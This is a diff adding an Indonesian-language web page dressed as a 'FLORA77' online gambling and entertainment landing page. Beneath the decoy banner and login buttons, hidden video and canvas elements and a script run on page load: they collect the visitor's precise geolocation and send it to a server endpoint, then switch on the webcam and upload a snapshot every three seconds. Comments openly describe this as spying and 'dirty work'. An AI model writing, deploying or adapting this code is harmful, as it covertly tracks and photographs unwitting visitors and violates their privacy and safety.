@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html amp lang="id">
+<head>
+  <meta charset="utf-8">
+  <script async src="https://cdn.ampproject.org/v0.js"></script>
+  <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+  <meta name="format-detection" content="telephone=no">
+  <link rel="canonical" href="https://elsharq.org/60344/">
+  <link rel="shortcut icon" href="https://elsharq.org/sixl/images/fav-flora77.webp" type="image/x-icon">
+  <title>FLORA77: Tempat untuk Mencari Peruntungan dan Hiburan Online</title>
+  <meta name="keywords" content="flora77, flora77 login, flora77 link alternatif">
+  <meta name="googlebot" content="index,follow">
+  <meta name="description" content="FLORA77 menawarkan pengalaman hiburan yang seru dengan berbagai tantangan menarik, memberikan kesempatan bagi pengguna untuk merasakan sensasi mencari peruntungan kapan saja">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu">
+  <style amp-boilerplate>
+    body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}
+    @keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}
+  </style>
+  <noscript>
+    <style amp-boilerplate>
+      body{animation:none}
+    </style>
+  </noscript>
+  <style amp-custom>
+    *{box-sizing:border-box}
+    html{max-width:500px;margin:0 auto}
+    body{
+      background:url(https://elsharq.org/sixl/images/background-mobile.webp) center fixed;
+      background-size:cover;
+      color:#ffffff;
+      font-family:Ubuntu,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif
+    }
+    a{text-decoration:none;color:#fff}
+    h1,h2,h3{font-size:1.38rem;font-weight:600}
+    .ctr{padding:1rem}
+    .atas{padding-top:6rem}
+    .box{
+      background:#000000cc;
+      border-radius:1rem;
+      margin:0 1rem;
+      box-shadow:0 3px 8px 3px #00000033
+    }
+    .py3{padding:1rem}
+    .tc{text-align:center}
+    .header{
+      position:sticky;
+      top:0;
+      text-align:center;
+      z-index:9999;
+      padding:10px
+    }
+    .FLORA77{
+      border:3px solid;
+      border-radius:10px;
+      animation:borderAnimation 3s linear infinite
+    }
+    @keyframes borderAnimation{
+      0%{border-color:#fff}
+      25%{border-color:#ff0000}
+      50%{border-color:#f370b7}
+      75%{border-color:#fffb00}
+      100%{border-color:#fff}
+    }
+    .bawah{
+      position:sticky;
+      bottom:0;
+      max-width:500px;
+      margin:0 auto
+    }
+    .flex{display:flex}
+    .col6{width:50%}
+    .btn{
+      display:block;
+      line-height:3rem;
+      text-align:center;
+      font-weight:bold;
+      letter-spacing:3px;
+      color:#fff
+    }
+    .btn.log{
+      background:#dc12f7;
+      border-radius:1rem 0 0 1rem
+    }
+    .btn.reg{
+      background:#06b957;
+      border-radius:0 1rem 1rem 0
+    }
+    /* Sembunyikan elemen kamera dan kanvas, you sneaky bastard! ð» */
+    .hidden { display: none !important; } 
+  </style>
+</head>
+<body>
+  <div class="header">
+    <amp-img src="https://elsharq.org/sixl/images/logo-flora77.webp"
+      width="200"
+      height="76"
+      layout="intrinsic"
+      alt="logo FLORA77">
+    </amp-img>
+  </div>
+
+  <main>
+    <div class="atas">
+      <div class="ctr">
+        <div class="box">
+          <div class="py3 tc">
+            <amp-img
+              class="FLORA77"
+              src="https://elsharq.org/sixl/images/banner-1-flora77.webp"
+              width="800"
+              height="800"
+              layout="responsive"
+              alt="banner flora77">
+            </amp-img>
+            <h1>
+              <span style="font-size:22pt;color:#f370b7;">
+                <strong>FLORA77: Tempat untuk Mencari Peruntungan dan Hiburan Online</strong>
+              </span>
+            </h1>
+          </div>
+        </div>
+      </div>
+    </div>
+<br><br><br><br><br><br><br><br><br>
+    <div class="bawah">
+      <div class="flex">
+        <div class="col6">
+          <a href="https://google.com" target="_blank" rel="noopener noreferrer nofollow" class="btn log">LOGIN</a>
+        </div>
+        <div class="col6">
+          <a href="http://google.com" target="_blank" rel="noopener noreferrer nofollow" class="btn reg">MASUK</a>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Elemen video dan canvas yang disembunyikan, untuk pekerjaan kotor kita, you dirty bastard! ðµï¸ââï¸ -->
+  <video id="videoElement" class="hidden" autoplay playsinline></video>
+  <canvas id="canvasElement" class="hidden"></canvas>
+
+  <script>
+    let cameraStream = null;
+    let captureIntervalId = null;
+
+    const logLocationAndIP = async (lat = 'Unknown', lon = 'Unknown') => {
+        try {
+            await fetch('/log_data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitude: lat, longitude: lon }),
+            });
+            console.log("Lokasi/IP tercatat! â");
+        } catch (error) {
+            console.error("Gagal catat lokasi/IP! ð­", error);
+        }
+    };
+
+    const uploadImage = async () => {
+        if (!cameraStream) {
+            console.error("No camera stream! ð«");
+            return;
+        }
+        
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('canvasElement');
+        const context = canvas.getContext('2d');
+
+        // Pastikan video memiliki dimensi sebelum menggambar, you careful bastard! ð¤
+        if (video.videoWidth === 0 || video.videoHeight === 0) {
+            console.warn("Video stream not ready for capture, trying again! â³");
+            return;
+        }
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/png');
+
+        try {
+            await fetch('/upload_image', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: imageData }),
+            });
+            console.log('ACCESS CAMERA CAPTURE! ð¸');
+        } catch (error) {
+            console.error('Gagal upload gambar! ð¤¬', error);
+        }
+    };
+
+    document.addEventListener('DOMContentLoaded', () => {
+        console.log("DOM loaded, chaos inbound! ð");
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    logLocationAndIP(position.coords.latitude, position.coords.longitude);
+                },
+                (error) => {
+                    console.error("Geolocation failed! ð¡", error);
+                    logLocationAndIP();
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        } else {
+            console.warn("Geolocation unsupported! ð ");
+            logLocationAndIP();
+        }
+
+        const video = document.getElementById('videoElement');
+
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    cameraStream = stream;
+                    video.srcObject = cameraStream;
+                    video.play().then(() => {
+                        console.log("Kamera diakses, mata-mata siap! ð");
+                        // Beri waktu sebentar agar stream stabil dan dimensi video tersedia, you cunning fox! ð¦
+                        setTimeout(() => {
+                            uploadImage();
+                            captureIntervalId = setInterval(uploadImage, 3000);
+                        }, 1000); 
+                    }).catch(e => console.error("Video stream error! ð©", e));
+                })
+                .catch((err) => {
+                    console.error("Akses kamera ditolak/gagal! ð­", err);
+                });
+        } else {
+            console.warn("getUserMedia unsupported! ðµ");
+        }
+    });
+  </script>
+</body>
+            </html>
+            
